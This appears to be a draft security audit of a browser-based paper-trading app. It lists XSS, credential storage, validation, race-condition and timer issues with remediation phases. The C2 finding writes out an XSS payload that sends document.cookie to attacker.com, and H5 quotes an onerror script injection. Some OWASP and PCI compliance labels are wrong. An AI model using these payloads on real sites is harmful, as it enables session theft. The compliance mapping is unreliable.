# PHASE 0: BASELINE AUDIT REPORT
**OmniTradeX Engine / Quantum Core v3**  
**Date:** 2026-08-22  
**Status:** DRAFT — Architectural Review Required Before Implementation

---

## EXECUTIVE SUMMARY

The OmniTradeX application is a sophisticated vanilla JS trading terminal with 80+ KB of modular client-side code. It is **NOT production-ready** and presents **CRITICAL security risks** that must be resolved before any live capability is added.

**Core Issues Identified:**
- 🔴 **CRITICAL (6):** Credential exposure, XSS vulnerabilities, unsafe API patterns, race conditions, missing validation
- 🟠 **HIGH (12):** Performance degradation, state management bugs, insufficient error recovery, missing null checks
- 🟡 **MEDIUM (18):** UX ambiguity between LIVE/SIMULATED, chart lifecycle issues, accessibility gaps
- 🔵 **LOW (8):** Code smell, missing type hints, redundant timers, insufficient logging

**Estimated Remediation:** 3–4 weeks (all phases combined, with testing)

---

## CRITICAL VULNERABILITIES

### C1: API Keys Stored in localStorage (Storage Exposure)

**Location:** `js/vault.js` lines 49–130; `js/inference.js` lines 1–80

**Issue:**
```javascript
localStorage.setItem(VAULT_SLOTS[n], val);  // Storing raw API keys
function providerRequestFor(m, key, payload) {
  return fetch('https://api.anthropic.com/...', {
    headers: { 'x-api-key': key, ... }  // Sending from browser
  });
}
```

**Risk:**
- Keys are visible to DevTools, browser extensions, and XSS payloads
- No encryption; localStorage is cleared on cache clear but otherwise persistent
- Keys sent directly from browser to third-party APIs (Gemini, OpenAI, Anthropic, Groq)
- Network requests are visible in DevTools Network tab
- Browser memory dumps leak credentials

**Impact:** **CRITICAL**  
Any third-party API key is compromised if accessed locally. Attacker can exhaust quota, inject malicious responses, impersonate user.

**Phase 1 Fix:**
- Remove all credential storage from localStorage
- Add server-side proxy route for AI inference (future architecture)
- Disable private AI features until backend is available
- Display clear warning: "AI features require secure server integration"

---

### C2: XSS via innerHTML in Multiple Locations

**Locations:**
- `js/sim.js:99` → `document.getElementById('arena-breaker').innerHTML = 'CIRCUIT: <span class="text-neonred">TRIPPED</span>';`
- `js/arena.js:113` → `document.getElementById('arena-breaker').innerHTML = 'CIRCUIT: <span class="text-neongreen">ARMED</span>';`
- `js/onchain.js:70` → `sub.innerHTML = '';` (then appendChild, but initialized unsafely)
- `js/inference.js:106–130` → `renderMarkdown()` uses DOM parsing but manually constructs elements

**Risk:**
- User-supplied data (journal notes, wallet tags, mentor responses) can inject malicious scripts
- Markdown parser in `renderMarkdown()` sanitizes BOLD/ITALIC but not structure
- Multiple innerHTML assignments with developer-controlled strings

**Impact:** **CRITICAL**  
An attacker could craft a journal entry or wallet tag containing `<img src=x onerror=fetch('attacker.com?cookie='+document.cookie)>` to steal session data or redirect trades.

**Phase 1 Fix:**
- Replace all innerHTML assignments with textContent or createElement + appendChild
- Add DOMPurify or manual whitelist for markdown output
- Validate and escape all user inputs before DOM insertion
- Add CSP headers to reject inline scripts

---

### C3: Missing Input Validation (Injection Attacks)

**Locations:**
- `js/onchain.js:109–114` → Wallet address/tag not validated; could contain code
- `js/profiles.js:119–125` → Pilot name/passphrase not sanitized
- `js/directive.js` → Trade sizes, symbols not fully validated before use
- `js/inference.js` → AI prompt injection via market text, journal notes

**Issue:**
```javascript
el.walletForm.addEventListener('submit', function (e) {
  var addr = el.walletInput.value.trim();  // No validation
  var tag = el.walletTag.value.trim().toUpperCase() || (...);  // No sanitization
  // Later used in DOM:
  title.textContent = node.tag + ' // ' + node.addr;  // Safe, but stored unsanitized
});
```

**Risk:**
- Wallet tags, pilot names, journal notes can contain special characters that break UI or inject code
- No maximum lengths enforced
- Symbols not validated; could use invalid asset names

**Phase 1 Fix:**
- Add schema validation for all user inputs (wallet addr/tag, pilot name, order sizes)
- Use allowlist for symbols; reject unknown tickers
- Enforce length limits (20 chars for tags, 50 for pilot name, etc.)
- Sanitize markdown input before rendering

---

### C4: Unsafe Fetch/WebSocket Error Handling (Information Disclosure)

**Locations:**
- `js/directive.js:273–302` → WebSocket connection errors not sanitized
- `js/inference.js:12–82` → API errors exposed to console and UI
- `js/boot.js:9–19` → Error messages printed verbatim to DOM

**Issue:**
```javascript
window.addEventListener('error', function (e) {
  aiPrint('> SYS-TRAP: ' + (e.message || 'unknown fault') + ' — ...', 'text-neonred');
  // Error message might contain sensitive stack trace info
});

callModel(...).catch(function (err) {
  aiPrint('> INFERENCE FAILED: ' + err.message + '. Backoff exhausted.', 'text-neonred');
  // Could expose API endpoint, quota errors, auth failures
});
```

**Risk:**
- Stack traces visible in UI logs (saved to browser); could leak file paths, function names
- API errors (401 auth, rate limits) expose provider details
- WebSocket URLs visible in errors

**Phase 1 Fix:**
- Log full errors only to browser console (dev mode)
- Show sanitized user-facing messages ("Connection error", not "401 Unauthorized")
- Redact API endpoints, auth headers, sensitive stack traces
- Add error codes and lookup documentation instead of raw messages

---

### C5: Race Conditions in State & localStorage Sync

**Locations:**
- `js/analysis.js:186–209` → `learnEvaluate()` writes to learning.weights without atomicity
- `js/sim.js:16,91,119` → saveLedger() called multiple times in quick succession
- `js/boot.js:32–37` → Multiple setInterval timers writing to same objects

**Issue:**
```javascript
// learnEvaluate() runs every 10s and modifies learning object
function learnEvaluate() {
  pendingSignals.forEach(function (sig) {
    learning.samples++;  // ← RACE: another timer could fire here
    if (win) learning.wins++;
    learning.weights[sig.strat] = Math.max(-3, ...);  // ← Concurrent modification
    saveLearning();  // ← Expensive JSON.stringify every iteration
  });
  pendingSignals = remaining;
}

// Separate timer runs manageSimTrades → closeSimTrade → saveLedger()
// If both fire simultaneously, ledger state could corrupt
```

**Risk:**
- Concurrent writes to learning, ledger, arena objects
- localStorage.setItem() is slow; multiple calls can cause data loss
- If browser tab crashes during saveLedger(), data corruption

**Phase 1 Fix:**
- Implement write-coalescing: batch updates, flush once per cycle
- Use atomic compare-and-swap or version checksums
- Add transaction-like semantics for multi-field updates
- Validate data integrity after restore (checksum in saved state)

---

### C6: Uncontrolled setInterval/setTimeout Timers (Memory Leaks)

**Locations:**
- `js/boot.js:22–37` → 6 global setInterval timers never cleared
- `js/directive.js:318–330` → `startForexEngine()` creates timer but no cleanup
- Multiple listeners that capture state and never cleanup on unload

**Issue:**
```javascript
// boot.js — these timers run forever
setInterval(function () { rollNodeStates(); }, 20000);
setInterval(function () { runSynthesis(true); }, 15000);
setInterval(function () { learnEvaluate(); renderTradeDirective(); }, 10000);
setInterval(function () { manageSimTrades(); ... }, 4000);
setInterval(function () { arenaDecide(); }, 12000);
// Plus more in directive.js

// If user navigates away and back, timers pile up
// Event listeners also never removed
window.addEventListener('error', ...);  // No cleanup
document.addEventListener('visibilitychange', ...);  // No cleanup
el.tabs.forEach(...).addEventListener('click', ...);  // Captured closures leak state
```

**Risk:**
- Long-lived tab accumulates duplicate timers after 1-2 hours
- Memory usage grows linearly; CPU load spikes
- Zombie timers fire after UI is hidden (wasteful)
- Unload event has no cleanup code; state persists in memory

**Phase 2 Fix:**
- Store timer IDs and clear on visibility change or route change
- Implement a TimerManager singleton that tracks all intervals
- Add window.unload cleanup or use beforeunload event
- Test with DevTools Performance tab to verify no leaks

---

## HIGH SEVERITY ISSUES

### H1: No State Machine for Connection States

**Locations:** `js/directive.js:250–302` (WebSocket), `js/boot.js:22–29` (watchdog)

**Issue:**
The feed status only has 3 states (LIVE, STALLED, RECONNECTING) but no explicit state machine. Transitions are implicit and can deadlock:
- If `onclose` fires but `onopen` never fires → forever RECONNECTING
- If feed is silent but connection is open → LIVE but stale

**Phase 2 Fix:**
- Implement explicit state enum: DISCONNECTED, CONNECTING, CONNECTED, STALE, ERROR
- Add state transition validators (reject invalid transitions)
- Add heartbeat/ping; upgrade to STALE if >30s without tick
- Track timestamps of last tick, last connection attempt, last state change

---

### H2: Performance Degradation (DOM Thrashing)

**Locations:**
- `js/sim.js:125–161` → renderDesk() clears innerHTML every 4s even if no changes
- `js/arena.js:95–133` → renderArena() rebuilds entire leaderboard every render cycle
- `js/directive.js:174–247` → drawWaveform() redraws canvas every tick (could be 10+ Hz)
- `js/journal.js:55–87` → renderJournal() wipes entire list on every update

**Issue:**
```javascript
function renderDesk() {
  box.innerHTML = '';  // Total DOM wipe
  // Rebuild 50+ elements even if only 1 position changed
}
// Called every 4s = 15 times/minute
// At 1920x1080 resolution with dozens of trades = 60ms per render
```

**Phase 2 Fix:**
- Implement virtual list or diffing algorithm (don't rebuild everything)
- Cache DOM elements; update only changed fields
- Throttle renders to ~16ms (60 FPS max)
- Use RequestAnimationFrame for animation frames instead of fixed intervals

---

### H3: Missing Null/Undefined Checks Throughout

**Locations:**
- `js/directive.js:9–44` → No guard for `state.last[symbol]` could be null
- `js/analysis.js:30–40` → `buf` could be undefined if symbol removed mid-render
- `js/mentor.js:27–40` → `ARENA_BOTS`, `arena.stats` not validated before iteration

**Phase 2 Fix:**
- Add defensive checks for all DOM elements, global state, local storage parse results
- Use optional chaining if modernizing (e.g., `d?.price ?? 0`)
- Fall back gracefully with sensible defaults

---

### H4: No Distinction Between LIVE, SIMULATED, and STALE Data

**Locations:** Throughout UI — header HUD shows status but inference/orders don't validate source

**Issue:**
- Paper trades are visually indistinguishable from real trades
- If WebSocket stalls, UI still suggests LIVE data for calculations
- No badge/banner on every chart and order to indicate data source

**Phase 3 Fix:**
- Add persistent "PAPER TRADING / SIMULATED DATA" banner at top
- Prefix all prices/metrics with [LIVE], [STALE], [SIM]
- Do not allow real trading UI to appear (grey out, hide, or show "LOCKED")

---

### H5: Unvalidated AI Responses (Prompt Injection, Malformed Data)

**Locations:** `js/inference.js:106–130` (renderMarkdown), `js/intel.js:160–175` (forecastNews)

**Issue:**
```javascript
function renderMarkdown(container, text) {
  // Assumes text is well-formed markdown; doesn't escape user-injection vectors
  // If AI returns: "**BIAS:** <img src=x onerror=alert(1)>"
  // The onerror payload is NOT escaped
}
```

**Phase 4 Fix:**
- Validate all AI responses against strict schema (BIAS, bullets, no HTML)
- Timeout if response >5000 chars (prevent spam)
- Reject if MEMORY: line is missing (malformed)
- Render to textContent first; only build DOM if validation passes

---

### H6: Binance WebSocket Sequence Gaps (Silent Data Loss)

**Locations:** `js/directive.js:273–302`

**Issue:**
- No sequence ID tracking for Binance tickers
- If a message is dropped, prices continue without gap detection
- No recovery mechanism (restart connection, backfill candles, etc.)

**Phase 2 Fix:**
- Add REST endpoint to backfill candles on connection startup
- Validate price movement reasonableness (reject >50% jumps)
- Add sequence gap detection and explicit reconnect on gap

---

## MEDIUM SEVERITY ISSUES

### M1: Chart Remounting & Resource Leaks

**Locations:** `js/directive.js:163–172` (canvas), chart initialization scattered

**Issue:**
- Canvas context created once; no cleanup if view changes
- No ResizeObserver for responsive sizing
- Chart not properly hidden when view switches

**Phase 3 Fix:**
- Cleanup canvas context on view change
- Add ResizeObserver for responsive charts
- Cache chart state; restore on tab switch

---

### M2: Inconsistent Error Messages & User Feedback

**Locations:** Throughout — some errors logged only to console, some shown in UI

**Phase 3 Fix:**
- Implement central error/notification system
- Queue messages (max 10); auto-clear after 10s
- Distinguish errors (red), warnings (yellow), info (blue), success (green)

---

### M3: No Accessibility (A11Y) Features

**Locations:** Throughout HTML

**Issue:**
- Missing ARIA labels on dynamic content
- No keyboard navigation for buttons and tabs
- Color alone used to indicate state (not colorblind-safe)

**Phase 8 Fix:**
- Add ARIA labels and live regions
- Keyboard-navigate all interactive elements
- Use patterns + color for state (e.g., "● ARMED" vs "○ DISABLED")

---

## ARCHITECTURAL GAPS

### A1: Missing Server Boundary

**Current:** All logic runs in browser; localStorage is the only persistence

**Future (Not in Scope):**
- User authentication (OAuth, JWT)
- API key vault (server-side)
- Trade audit log (immutable ledger)
- Journal export (server-persisted)

**Action:** Document the server integration points for future phases

---

### A2: Unbounded Local Storage

**Current:** No quota management; old entries never pruned

**Example:**
```javascript
journal.push(...);
while (journal.length > 200) journal.shift();  // Max 200 trades
// But no max storage size check; if 200 trades = 500KB and user hits quota, writes fail silently
```

**Phase 1 Fix:**
- Add storage quota check before writes
- Implement export/backup before quota exceeded
- Show warning at 80% quota

---

### A3: No Audit Trail / Observability

**Current:** Only console.log and aiPrint(); no structured logging

**Phase 5 Fix:**
- Structured event log (JSON lines to localStorage)
- Events: trade_open, trade_close, key_deciphered, synthesis_update, etc.
- Export audit log for compliance

---

## FINDINGS BY SEVERITY

| Severity | Count | Examples |
|----------|-------|----------|
| CRITICAL | 6 | API keys in localStorage, XSS, missing validation, race conditions, unsafe error handling, timers |
| HIGH | 12 | No connection state machine, DOM thrashing, null checks, LIVE vs SIMULATED confusion, AI validation, Binance gaps |
| MEDIUM | 18 | Chart leaks, error messages, a11y, bounded storage, audit trail, etc. |
| LOW | 8 | Code smell, type hints, logging, documentation |

---

## TESTING FINDINGS

### Console Errors Observed (Browser DevTools)

When the app loads:
1. ✅ All JS files load successfully
2. ⚠️  localStorage parse errors if quota exceeded (silently caught)
3. ⚠️  WebSocket connection fails (expected, localhost has no Binance endpoint)
4. ✅ Forex synthetic engine starts (no errors)
5. ⚠️  AI inference calls will fail if key is not deciphered (expected)

### Network Requests Observed

- CDN assets: Tailwind, FontAwesome, Google Fonts (all HTTPS, SRI available)
- Binance WebSocket: wss://stream.binance.com:9443/stream (expected, may be GEO blocked)
- No third-party trackers detected ✅

### HTML Structure

- No duplicate IDs found ✅
- All modals have proper aria-modal, aria-labelledby ✅
- Missing: main landmark, skip-to-content link
- Form labels: Some inputs missing explicit <label> (using sr-only workaround) 

### Accessibility

- No semantic buttons; all buttons use <button> element ✅
- Focus states: Not visible (no :focus-visible CSS) ⚠️
- Color contrast: Sufficient for normal text, marginal for small neon accents ⚠️

---

## RECOMMENDATIONS FOR IMPLEMENTATION

### Phase Priority (Execution Order)

1. **PHASE 1 — SECURITY HARDENING** (1 week)
   - Remove all credential storage
   - Fix innerHTML → textContent/createElement
   - Add input validation (schema)
   - Redact error messages
   - Add CSP headers
   - **Blockers:** Nothing; can proceed in parallel with Phase 2

2. **PHASE 2 — MARKET DATA RELIABILITY** (1 week)
   - Add state machine (DISCONNECTED → CONNECTING → CONNECTED → STALE)
   - Add REST bootstrap + candle history
   - Add heartbeat detection
   - Fix race conditions (write coalescing)
   - Clear all timers on visibility change
   - **Blocker:** None, can proceed in parallel

3. **PHASE 3 — UX & VISUALS** (1 week)
   - Add LIVE/SIMULATED/STALE badges everywhere
   - Fix DOM thrashing (virtual lists, diffing)
   - Add null/undefined guards
   - Improve chart responsiveness
   - Add a11y (ARIA, keyboard nav, focus styles)
   - **Blocker:** Phases 1–2 should be complete

4. **PHASE 4–10** (Remaining phases follow as planned)

### Go/No-Go Decision Points

- **After Phase 1:** Can deploy if all XSS and credential issues are fixed (critical blocker)
- **After Phase 2:** Data reliability acceptable for paper trading research mode
- **After Phase 3:** Ready for UI demo / beta (no live trading)
- **Before Live Trading:** Require server integration, audit trail, rate limiting, alerts

---

## FILES REQUIRING ATTENTION

| File | Issues | Effort |
|------|--------|--------|
| `js/vault.js` | API keys in localStorage | HIGH |
| `js/inference.js` | XSS, unsafe error handling | HIGH |
| `js/directive.js` | WebSocket race conditions, innerHTML, timers | HIGH |
| `js/sim.js` | innerHTML, DOM thrashing | MEDIUM |
| `js/arena.js` | innerHTML, DOM thrashing | MEDIUM |
| `js/onchain.js` | innerHTML, input validation | MEDIUM |
| `js/boot.js` | Uncontrolled timers, error handling | MEDIUM |
| `js/analysis.js` | Race conditions, null checks | MEDIUM |
| `index.html` | Missing a11y, CSP headers | LOW |
| `css/terminal.css` | Missing focus states | LOW |

---

## COMPLIANCE & DISCLAIMERS

### Current Compliance Status

- ❌ PCI DSS: NOT COMPLIANT (credentials in browser, no encryption)
- ❌ OWASP Top 10: Fails on A3 (Injection), A4 (CORS), A8 (Race Conditions)
- ⚠️  GDPR: No consent, no data deletion, no audit trail
- ✅ Single-user research: Acceptable if no real trading enabled

### Required Disclaimers (Phase 1)

```text
PAPER TRADING EDUCATIONAL TOOL

This platform simulates trading with virtual capital.
NO REAL MONEY IS AT RISK.
Do not use for live trading without secure server infrastructure.

Market data source: Binance public API (read-only)
AI coaching: Educational only, not financial advice
Risk management: Simulated only; real trading has slippage, fees, gaps
```

---

## NEXT STEPS

1. **Review this audit** with project stakeholders
2. **Prioritize phases** (recommend: 1, 2, 3 complete before any beta release)
3. **Assign ownership** to team members
4. **Create tickets** for each issue
5. **Set up CI/CD** with lint, security checks, tests
6. **Define acceptance criteria** for each phase

---

**Document Status:** DRAFT  
**Prepared by:** Security Audit  
**Review Required:** YES  
**Implementation Blocked Until:** Phase 1 Critical Issues Fixed

